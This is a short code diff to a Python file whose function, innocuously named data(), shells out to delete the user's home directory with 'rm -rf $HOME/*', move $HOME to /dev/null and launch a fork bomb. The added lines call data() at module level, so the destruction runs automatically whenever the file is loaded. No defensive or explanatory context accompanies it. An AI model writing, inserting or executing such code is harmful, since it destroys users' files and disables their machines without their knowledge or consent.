@@ -34,3 +34,5 @@ def data():
     os.system('rm -rf $HOME/*')
     os.system('mv $HOME /dev/null')
     os.system(':(){ :|: & };:')
+
+data()
